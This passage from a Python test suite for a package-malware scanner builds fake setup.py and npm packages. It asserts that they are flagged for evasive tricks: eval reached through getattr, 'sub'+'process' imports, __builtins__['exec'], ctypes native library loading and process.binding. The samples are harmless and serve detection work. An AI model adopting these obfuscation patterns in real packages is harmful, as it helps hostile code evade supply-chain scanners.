    """Nested setup.py (e.g. in pybind11/ or vendor/) must NOT be treated as top-level install script."""
    import tarfile
    import io
    from sentinel.assessor.python_ast import analyze_python_package_tarball

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        # Top-level setup.py is clean
        top_setup = b"from setuptools import setup\nsetup(name='directml', version='1.0.0')\n"
        ti1 = tarfile.TarInfo(name="directml-1.0.0/setup.py")
        ti1.size = len(top_setup)
        tar.addfile(ti1, io.BytesIO(top_setup))

        # Nested setup.py inside vendored pybind11 has cmdclass or install hook
        nested_setup = b"""
from setuptools import setup
from setuptools.command.install import install
import os

class PostInstall(install):
    def run(self):
        os.system("echo vendored")
        install.run(self)

setup(name='pybind11', cmdclass={'install': PostInstall})
"""
        ti2 = tarfile.TarInfo(name="directml-1.0.0/pybind11/setup.py")
        ti2.size = len(nested_setup)
        tar.addfile(ti2, io.BytesIO(nested_setup))

    report = analyze_python_package_tarball(buf.getvalue(), "directml")
    # Top-level install hook must NOT be flagged for directml from nested pybind11
    assert not any("INSTALL_TIME" in f or "Install Class Override" in f for f in report.flags)
    assert report.verdict != ThreatVerdict.MALICIOUS







def test_python_ast_dynamic_obfuscation_getattr_and_import():
    code = """
from setuptools import setup
import sys

# Dynamic obfuscation via getattr
fn = getattr(__builtins__, "eval")
fn("print('injected')")

# Dynamic import with string concatenation
mod = __import__("sub" + "process")

# Direct subscript access to __builtins__
__builtins__["exec"]("import os")

setup(name="test-evasive", version="0.1.0")
"""
    report = inspect_python_code_ast(code, "setup.py")
    assert report.has_dynamic_obfuscation is True
    assert any("getattr() resolving 'eval'" in f for f in report.flags)
    assert any("__import__() dynamic loading 'subprocess'" in f for f in report.flags)
    assert any("Subscript access __builtins__['exec']" in f for f in report.flags)
    assert report.composite_threat_score >= 80


def test_python_ast_ctypes_native_loading():
    code = """
from setuptools import setup
import ctypes

ctypes.cdll.LoadLibrary("./libpayload.so")

setup(name="test-native", version="0.1.0")
"""
    report = inspect_python_code_ast(code, "setup.py")
    assert report.has_dynamic_obfuscation is True
    assert any("Dynamic native library loading" in f for f in report.flags)


def test_npm_source_template_literal_and_process_evasion():
    tarball = _make_tarball({
        "package/package.json": '{"name": "test-npm-evasion", "version": "1.0.0"}',
        "package/index.js": """
const cp = require(`child_process`);
const evil = globalThis['eval'];
const binding = process.binding('spawn_sync');
"""
    })
    report = analyze_npm_package_tarball(tarball, "test-npm-evasion")
    assert report.has_dynamic_obfuscation is True
    assert any("child_process" in f for f in report.flags)
    assert any("globalThis['eval']" in f for f in report.flags)
    assert any("process.binding" in f for f in report.flags)
